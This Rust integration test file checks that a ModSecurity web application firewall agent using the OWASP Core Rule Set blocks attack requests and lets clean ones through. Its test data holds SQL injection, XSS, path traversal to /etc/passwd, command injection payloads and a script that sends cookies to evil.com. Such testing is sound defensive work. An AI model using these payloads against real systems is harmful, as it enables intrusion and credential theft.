//! Integration tests using the actual OWASP Core Rule Set (CRS).
//!
//! These tests verify that the agent works correctly with the real CRS rules.
//! The CRS must be present in testdata/crs/ for these tests to run.

use base64::Engine;
use sentinel_agent_modsec::{ModSecAgent, ModSecConfig};
use sentinel_agent_protocol::{
    AgentClient, AgentServer, Decision, EventType, RequestBodyChunkEvent, RequestHeadersEvent,
    RequestMetadata,
};
use std::collections::HashMap;
use std::path::Path;
use std::time::Duration;
use tempfile::tempdir;

/// Check if CRS is available
fn crs_available() -> bool {
    Path::new("testdata/crs/crs-setup.conf").exists()
        && Path::new("testdata/crs/rules").is_dir()
}

/// Get CRS rules paths
fn get_crs_paths() -> Vec<String> {
    vec![
        "testdata/crs/crs-setup.conf".to_string(),
        "testdata/crs/rules/*.conf".to_string(),
    ]
}

/// Helper to start a CRS-based agent server
async fn start_crs_server(config: ModSecConfig) -> Option<(tempfile::TempDir, std::path::PathBuf)> {
    if !crs_available() {
        return None;
    }

    let dir = tempdir().expect("Failed to create temp dir");
    let socket_path = dir.path().join("modsec-crs-test.sock");

    let agent = match ModSecAgent::new(config) {
        Ok(agent) => agent,
        Err(e) => {
            eprintln!("Failed to create agent with CRS: {}", e);
            return None;
        }
    };

    let server = AgentServer::new("test-modsec-crs", socket_path.clone(), Box::new(agent));

    tokio::spawn(async move {
        let _ = server.run().await;
    });

    // Give server time to start
    tokio::time::sleep(Duration::from_millis(100)).await;

    Some((dir, socket_path))
}

/// Create a client connected to the test server
async fn create_client(socket_path: &std::path::Path) -> AgentClient {
    AgentClient::unix_socket("test-client", socket_path, Duration::from_secs(5))
        .await
        .expect("Failed to connect to agent")
}

/// Create a basic request metadata
fn make_metadata() -> RequestMetadata {
    let id = uuid::Uuid::new_v4().to_string();
    RequestMetadata {
        correlation_id: id.clone(),
        request_id: id,
        client_ip: "127.0.0.1".to_string(),
        client_port: 12345,
        server_name: Some("example.com".to_string()),
        protocol: "HTTP/1.1".to_string(),
        tls_version: Some("TLSv1.3".to_string()),
        tls_cipher: None,
        route_id: Some("default".to_string()),
        upstream_id: None,
        timestamp: "2025-01-01T00:00:00Z".to_string(),
    }
}

/// Create a request headers event
fn make_request_headers(
    method: &str,
    uri: &str,
    headers: HashMap<String, Vec<String>>,
) -> RequestHeadersEvent {
    RequestHeadersEvent {
        metadata: make_metadata(),
        method: method.to_string(),
        uri: uri.to_string(),
        headers,
    }
}

/// Create a request body chunk event
fn make_body_chunk(correlation_id: &str, data: &str, is_last: bool) -> RequestBodyChunkEvent {
    RequestBodyChunkEvent {
        correlation_id: correlation_id.to_string(),
        data: base64::engine::general_purpose::STANDARD.encode(data),
        is_last,
        total_size: None,
        chunk_index: 0,
        bytes_received: data.len(),
    }
}

/// Check if decision is Block
fn is_block(decision: &Decision) -> bool {
    matches!(decision, Decision::Block { .. })
}

/// Check if decision is Allow
fn is_allow(decision: &Decision) -> bool {
    matches!(decision, Decision::Allow)
}

// ============================================================================
// CRS SQL Injection Tests (Rule 942xxx)
// ============================================================================

#[tokio::test]
async fn test_crs_sqli_union_select() {
    let config = ModSecConfig {
        rules_paths: get_crs_paths(),
        ..Default::default()
    };

    let Some((_dir, socket_path)) = start_crs_server(config).await else {
        eprintln!("Skipping test: CRS not available");
        return;
    };

    let mut client = create_client(&socket_path).await;

    // Classic UNION-based SQL injection
    let event = make_request_headers(
        "GET",
        "/search?id=1 UNION SELECT username,password FROM users--",
        HashMap::new(),
    );
    let response = client
        .send_event(EventType::RequestHeaders, &event)
        .await
        .expect("Failed to send event");

    println!("CRS SQLi UNION SELECT - Decision: {:?}", response.decision);
    assert!(is_block(&response.decision), "CRS should block UNION SELECT injection");
}

#[tokio::test]
async fn test_crs_sqli_boolean_based() {
    let config = ModSecConfig {
        rules_paths: get_crs_paths(),
        ..Default::default()
    };

    let Some((_dir, socket_path)) = start_crs_server(config).await else {
        eprintln!("Skipping test: CRS not available");
        return;
    };

    let mut client = create_client(&socket_path).await;

    // Boolean-based blind SQL injection
    let event = make_request_headers(
        "GET",
        "/user?id=1' AND '1'='1",
        HashMap::new(),
    );
    let response = client
        .send_event(EventType::RequestHeaders, &event)
        .await
        .expect("Failed to send event");

    println!("CRS SQLi Boolean - Decision: {:?}", response.decision);
    assert!(is_block(&response.decision), "CRS should block boolean-based SQLi");
}

#[tokio::test]
async fn test_crs_sqli_time_based() {
    let config = ModSecConfig {
        rules_paths: get_crs_paths(),
        ..Default::default()
    };

    let Some((_dir, socket_path)) = start_crs_server(config).await else {
        eprintln!("Skipping test: CRS not available");
        return;
    };

    let mut client = create_client(&socket_path).await;

    // Time-based blind SQL injection
    let event = make_request_headers(
        "GET",
        "/api?id=1; WAITFOR DELAY '0:0:5'--",
        HashMap::new(),
    );
    let response = client
        .send_event(EventType::RequestHeaders, &event)
        .await
        .expect("Failed to send event");

    println!("CRS SQLi Time-based - Decision: {:?}", response.decision);
    assert!(is_block(&response.decision), "CRS should block time-based SQLi");
}

// ============================================================================
// CRS XSS Tests (Rule 941xxx)
// ============================================================================

#[tokio::test]
async fn test_crs_xss_script_tag() {
    let config = ModSecConfig {
        rules_paths: get_crs_paths(),
        ..Default::default()
    };

    let Some((_dir, socket_path)) = start_crs_server(config).await else {
        eprintln!("Skipping test: CRS not available");
        return;
    };

    let mut client = create_client(&socket_path).await;

    let event = make_request_headers(
        "GET",
        "/page?name=<script>alert(document.cookie)</script>",
        HashMap::new(),
    );
    let response = client
        .send_event(EventType::RequestHeaders, &event)
        .await
        .expect("Failed to send event");

    println!("CRS XSS Script Tag - Decision: {:?}", response.decision);
    assert!(is_block(&response.decision), "CRS should block script tag XSS");
}

#[tokio::test]
async fn test_crs_xss_event_handler() {
    let config = ModSecConfig {
        rules_paths: get_crs_paths(),
        ..Default::default()
    };

    let Some((_dir, socket_path)) = start_crs_server(config).await else {
        eprintln!("Skipping test: CRS not available");
        return;
    };

    let mut client = create_client(&socket_path).await;

    let event = make_request_headers(
        "GET",
        "/page?img=<img src=x onerror=alert(1)>",
        HashMap::new(),
    );
    let response = client
        .send_event(EventType::RequestHeaders, &event)
        .await
        .expect("Failed to send event");

    println!("CRS XSS Event Handler - Decision: {:?}", response.decision);
    assert!(is_block(&response.decision), "CRS should block event handler XSS");
}

#[tokio::test]
async fn test_crs_xss_svg_onload() {
    let config = ModSecConfig {
        rules_paths: get_crs_paths(),
        ..Default::default()
    };

    let Some((_dir, socket_path)) = start_crs_server(config).await else {
        eprintln!("Skipping test: CRS not available");
        return;
    };

    let mut client = create_client(&socket_path).await;

    let event = make_request_headers(
        "GET",
        "/page?data=<svg onload=alert(1)>",
        HashMap::new(),
    );
    let response = client
        .send_event(EventType::RequestHeaders, &event)
        .await
        .expect("Failed to send event");

    println!("CRS XSS SVG Onload - Decision: {:?}", response.decision);
    assert!(is_block(&response.decision), "CRS should block SVG onload XSS");
}

// ============================================================================
// CRS Path Traversal Tests (Rule 930xxx)
// ============================================================================

#[tokio::test]
async fn test_crs_path_traversal_etc_passwd() {
    let config = ModSecConfig {
        rules_paths: get_crs_paths(),
        ..Default::default()
    };

    let Some((_dir, socket_path)) = start_crs_server(config).await else {
        eprintln!("Skipping test: CRS not available");
        return;
    };

    let mut client = create_client(&socket_path).await;

    let event = make_request_headers(
        "GET",
        "/download?file=../../../etc/passwd",
        HashMap::new(),
    );
    let response = client
        .send_event(EventType::RequestHeaders, &event)
        .await
        .expect("Failed to send event");

    println!("CRS Path Traversal - Decision: {:?}", response.decision);
    assert!(is_block(&response.decision), "CRS should block path traversal");
}

#[tokio::test]
async fn test_crs_path_traversal_windows() {
    let config = ModSecConfig {
        rules_paths: get_crs_paths(),
        ..Default::default()
    };

    let Some((_dir, socket_path)) = start_crs_server(config).await else {
        eprintln!("Skipping test: CRS not available");
        return;
    };

    let mut client = create_client(&socket_path).await;

    let event = make_request_headers(
        "GET",
        "/download?file=..\\..\\..\\windows\\system32\\config\\sam",
        HashMap::new(),
    );
    let response = client
        .send_event(EventType::RequestHeaders, &event)
        .await
        .expect("Failed to send event");

    println!("CRS Windows Path Traversal - Decision: {:?}", response.decision);
    assert!(is_block(&response.decision), "CRS should block Windows path traversal");
}

// ============================================================================
// CRS Command Injection Tests (Rule 932xxx)
// ============================================================================

#[tokio::test]
async fn test_crs_command_injection_semicolon() {
    let config = ModSecConfig {
        rules_paths: get_crs_paths(),
        ..Default::default()
    };

    let Some((_dir, socket_path)) = start_crs_server(config).await else {
        eprintln!("Skipping test: CRS not available");
        return;
    };

    let mut client = create_client(&socket_path).await;

    let event = make_request_headers(
        "GET",
        "/ping?host=127.0.0.1; cat /etc/passwd",
        HashMap::new(),
    );
    let response = client
        .send_event(EventType::RequestHeaders, &event)
        .await
        .expect("Failed to send event");

    println!("CRS Command Injection Semicolon - Decision: {:?}", response.decision);
    assert!(is_block(&response.decision), "CRS should block command injection with semicolon");
}

#[tokio::test]
async fn test_crs_command_injection_backticks() {
    let config = ModSecConfig {
        rules_paths: get_crs_paths(),
        ..Default::default()
    };

    let Some((_dir, socket_path)) = start_crs_server(config).await else {
        eprintln!("Skipping test: CRS not available");
        return;
    };

    let mut client = create_client(&socket_path).await;

    let event = make_request_headers(
        "GET",
        "/run?cmd=`id`",
        HashMap::new(),
    );
    let response = client
        .send_event(EventType::RequestHeaders, &event)
        .await
        .expect("Failed to send event");

    println!("CRS Command Injection Backticks - Decision: {:?}", response.decision);
    assert!(is_block(&response.decision), "CRS should block command injection with backticks");
}

#[tokio::test]
async fn test_crs_command_injection_pipe() {
    let config = ModSecConfig {
        rules_paths: get_crs_paths(),
        ..Default::default()
    };

    let Some((_dir, socket_path)) = start_crs_server(config).await else {
        eprintln!("Skipping test: CRS not available");
        return;
    };

    let mut client = create_client(&socket_path).await;

    let event = make_request_headers(
        "GET",
        "/exec?input=test | whoami",
        HashMap::new(),
    );
    let response = client
        .send_event(EventType::RequestHeaders, &event)
        .await
        .expect("Failed to send event");

    println!("CRS Command Injection Pipe - Decision: {:?}", response.decision);
    assert!(is_block(&response.decision), "CRS should block command injection with pipe");
}

// ============================================================================
// CRS Scanner Detection Tests (Rule 913xxx)
// ============================================================================

#[tokio::test]
async fn test_crs_scanner_sqlmap() {
    let config = ModSecConfig {
        rules_paths: get_crs_paths(),
        ..Default::default()
    };

    let Some((_dir, socket_path)) = start_crs_server(config).await else {
        eprintln!("Skipping test: CRS not available");
        return;
    };

    let mut client = create_client(&socket_path).await;

    let mut headers = HashMap::new();
    headers.insert(
        "User-Agent".to_string(),
        vec!["sqlmap/1.4.7#stable (http://sqlmap.org)".to_string()],
    );

    let event = make_request_headers("GET", "/api/users", headers);
    let response = client
        .send_event(EventType::RequestHeaders, &event)
        .await
        .expect("Failed to send event");

    println!("CRS Scanner sqlmap - Decision: {:?}", response.decision);
    assert!(is_block(&response.decision), "CRS should block sqlmap scanner");
}

#[tokio::test]
async fn test_crs_scanner_nikto() {
    let config = ModSecConfig {
        rules_paths: get_crs_paths(),
        ..Default::default()
    };

    let Some((_dir, socket_path)) = start_crs_server(config).await else {
        eprintln!("Skipping test: CRS not available");
        return;
    };

    let mut client = create_client(&socket_path).await;

    let mut headers = HashMap::new();
    headers.insert(
        "User-Agent".to_string(),
        vec!["Mozilla/5.00 (Nikto/2.1.6)".to_string()],
    );

    let event = make_request_headers("GET", "/", headers);
    let response = client
        .send_event(EventType::RequestHeaders, &event)
        .await
        .expect("Failed to send event");

    println!("CRS Scanner Nikto - Decision: {:?}", response.decision);
    assert!(is_block(&response.decision), "CRS should block Nikto scanner");
}

// ============================================================================
// CRS Protocol Attack Tests (Rule 921xxx)
// ============================================================================

#[tokio::test]
async fn test_crs_http_request_smuggling() {
    let config = ModSecConfig {
        rules_paths: get_crs_paths(),
        ..Default::default()
    };

    let Some((_dir, socket_path)) = start_crs_server(config).await else {
        eprintln!("Skipping test: CRS not available");
        return;
    };

    let mut client = create_client(&socket_path).await;

    let mut headers = HashMap::new();
    headers.insert(
        "Transfer-Encoding".to_string(),
        vec!["chunked".to_string(), "identity".to_string()],
    );

    let event = make_request_headers("POST", "/api", headers);
    let response = client
        .send_event(EventType::RequestHeaders, &event)
        .await
        .expect("Failed to send event");

    println!("CRS HTTP Smuggling - Decision: {:?}", response.decision);
    // Note: This may or may not trigger depending on CRS configuration
}

// ============================================================================
// CRS Body Inspection Tests
// ============================================================================

#[tokio::test]
async fn test_crs_sqli_in_json_body() {
    let config = ModSecConfig {
        rules_paths: get_crs_paths(),
        body_inspection_enabled: true,
        ..Default::default()
    };

    let Some((_dir, socket_path)) = start_crs_server(config).await else {
        eprintln!("Skipping test: CRS not available");
        return;
    };

    let mut client = create_client(&socket_path).await;

    let mut headers = HashMap::new();
    headers.insert(
        "Content-Type".to_string(),
        vec!["application/json".to_string()],
    );

    let headers_event = make_request_headers("POST", "/api/login", headers);
    let _ = client
        .send_event(EventType::RequestHeaders, &headers_event)
        .await
        .expect("Failed to send headers");

    let body = r#"{"username": "admin' OR '1'='1", "password": "test"}"#;
    let body_event = make_body_chunk(&headers_event.metadata.correlation_id, body, true);
    let response = client
        .send_event(EventType::RequestBodyChunk, &body_event)
        .await
        .expect("Failed to send body");

    println!("CRS SQLi in JSON Body - Decision: {:?}", response.decision);
    assert!(is_block(&response.decision), "CRS should block SQLi in JSON body");
}

#[tokio::test]
async fn test_crs_xss_in_form_body() {
    let config = ModSecConfig {
        rules_paths: get_crs_paths(),
        body_inspection_enabled: true,
        ..Default::default()
    };

    let Some((_dir, socket_path)) = start_crs_server(config).await else {
        eprintln!("Skipping test: CRS not available");
        return;
    };

    let mut client = create_client(&socket_path).await;

    let mut headers = HashMap::new();
    headers.insert(
        "Content-Type".to_string(),
        vec!["application/x-www-form-urlencoded".to_string()],
    );

    let headers_event = make_request_headers("POST", "/comment", headers);
    let _ = client
        .send_event(EventType::RequestHeaders, &headers_event)
        .await
        .expect("Failed to send headers");

    let body = "comment=<script>document.location='http://evil.com/?c='+document.cookie</script>";
    let body_event = make_body_chunk(&headers_event.metadata.correlation_id, body, true);
    let response = client
        .send_event(EventType::RequestBodyChunk, &body_event)
        .await
        .expect("Failed to send body");

    println!("CRS XSS in Form Body - Decision: {:?}", response.decision);
    assert!(is_block(&response.decision), "CRS should block XSS in form body");
}

// ============================================================================
// Clean Requests (Should Pass)
// ============================================================================

#[tokio::test]
async fn test_crs_clean_get_request() {
    let config = ModSecConfig {
        rules_paths: get_crs_paths(),
        ..Default::default()
    };

    let Some((_dir, socket_path)) = start_crs_server(config).await else {
        eprintln!("Skipping test: CRS not available");
        return;
    };

    let mut client = create_client(&socket_path).await;

    let mut headers = HashMap::new();
    headers.insert(
        "User-Agent".to_string(),
        vec!["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)".to_string()],
    );
    headers.insert("Accept".to_string(), vec!["text/html".to_string()]);

    let event = make_request_headers("GET", "/api/users?page=1&limit=20", headers);
    let response = client
        .send_event(EventType::RequestHeaders, &event)
        .await
        .expect("Failed to send event");

    println!("CRS Clean GET - Decision: {:?}", response.decision);
    assert!(is_allow(&response.decision), "CRS should allow clean GET request");
}

#[tokio::test]
async fn test_crs_clean_post_request() {
    let config = ModSecConfig {
        rules_paths: get_crs_paths(),
        body_inspection_enabled: true,
        ..Default::default()
    };

    let Some((_dir, socket_path)) = start_crs_server(config).await else {
        eprintln!("Skipping test: CRS not available");
        return;
    };

    let mut client = create_client(&socket_path).await;

    let mut headers = HashMap::new();
    headers.insert(
        "Content-Type".to_string(),
        vec!["application/json".to_string()],
    );
    headers.insert(
        "User-Agent".to_string(),
        vec!["Mozilla/5.0".to_string()],
    );

    let headers_event = make_request_headers("POST", "/api/users", headers);
    let _ = client
        .send_event(EventType::RequestHeaders, &headers_event)
        .await
        .expect("Failed to send headers");

    let body = r#"{"name": "John Doe", "email": "john@example.com", "age": 30}"#;
    let body_event = make_body_chunk(&headers_event.metadata.correlation_id, body, true);
    let response = client
        .send_event(EventType::RequestBodyChunk, &body_event)
        .await
        .expect("Failed to send body");

    println!("CRS Clean POST - Decision: {:?}", response.decision);
    assert!(is_allow(&response.decision), "CRS should allow clean POST request");
}

// ============================================================================
// Detect-Only Mode Tests
// ============================================================================

#[tokio::test]
async fn test_crs_detect_only_mode() {
    let config = ModSecConfig {
        rules_paths: get_crs_paths(),
        block_mode: false, // Detect only
        ..Default::default()
    };

    let Some((_dir, socket_path)) = start_crs_server(config).await else {
        eprintln!("Skipping test: CRS not available");
        return;
    };

    let mut client = create_client(&socket_path).await;

    // Send a malicious request
    let event = make_request_headers(
        "GET",
        "/search?q=<script>alert('xss')</script>",
        HashMap::new(),
    );
    let response = client
        .send_event(EventType::RequestHeaders, &event)
        .await
        .expect("Failed to send event");

    println!("CRS Detect-Only - Decision: {:?}", response.decision);

    // Should allow but with detection header
    assert!(is_allow(&response.decision), "Detect-only mode should allow request");

    let has_detection = response.request_headers.iter().any(|h| match h {
        sentinel_agent_protocol::HeaderOp::Set { name, .. } => name == "X-WAF-Detected",
        _ => false,
    });
    assert!(has_detection, "Should have X-WAF-Detected header");
}
